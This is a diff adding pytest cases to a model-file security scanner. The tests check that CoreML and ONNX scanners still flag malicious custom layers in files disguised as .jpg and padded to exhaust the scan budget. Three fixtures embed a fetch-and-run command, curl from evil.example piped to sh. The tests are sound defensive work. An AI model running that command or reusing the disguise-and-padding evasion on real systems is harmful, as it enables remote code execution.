@@ -30,7 +30,12 @@ from modelaudit.scanners.base import CheckStatus
 from modelaudit.utils.file.detection import LLAMAFILE_ROUTE_SCAN_BYTES, LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
 from modelaudit.utils.sources.cloud_storage import filter_scannable_files as filter_cloud_scannable_files
 from modelaudit.utils.sources.jfrog import filter_scannable_files as filter_jfrog_scannable_files
-from tests.helpers import create_mock_pytorch_zip
+from tests.helpers import (
+    create_mock_coreml,
+    create_mock_onnx,
+    create_mock_pytorch_zip,
+    prefix_mock_onnx_with_unknown_field,
+)
 
 
 def _build_malicious_pickle() -> bytes:
@@ -198,6 +203,73 @@ def test_scan_file_excluded_scanner_is_explicit_skip(tmp_path: Path) -> None:
     assert not result.issues
     assert any(check.name == "Scanner Selection" for check in result.checks)
     assert result.metadata["skipped_scanner_id"] == "pickle"
+
+
+def test_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(
+        tmp_path / "candidate.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
+
+    result = scan_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})
+
+    assert result.scanner_name == "coreml"
+    assert result.success is False
+    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)
+
+
+def test_nested_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(
+        tmp_path / "nested-candidate.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
+
+    result = scan_nested_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})
+
+    assert result.scanner_name == "coreml"
+    assert result.success is False
+    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)
+
+
+def test_excluded_coreml_scanner_is_not_run_for_renamed_candidate(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(
+        tmp_path / "excluded-candidate.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())
+
+    result = scan_file(str(model_path), config={"exclude_scanners": ["coreml"], "cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert not any("Custom CoreML layer detected" in issue.message for issue in result.issues)
+
+
+def test_selected_onnx_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "candidate.jpg", op_type="PythonOp")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)
+
+    result = scan_file(str(model_path), config={"scanners": ["onnx"], "cache_enabled": False})
+
+    assert result.scanner_name == "onnx"
+    assert result.success is False
+    assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
+
+
+def test_excluded_onnx_scanner_is_not_run_for_renamed_candidate(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "excluded-candidate.jpg", op_type="PythonOp")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)
+
+    result = scan_file(str(model_path), config={"exclude_scanners": ["onnx"], "cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
 
 
 def test_collect_suppressed_preferred_scanners_derives_from_checks(tmp_path: Path) -> None:
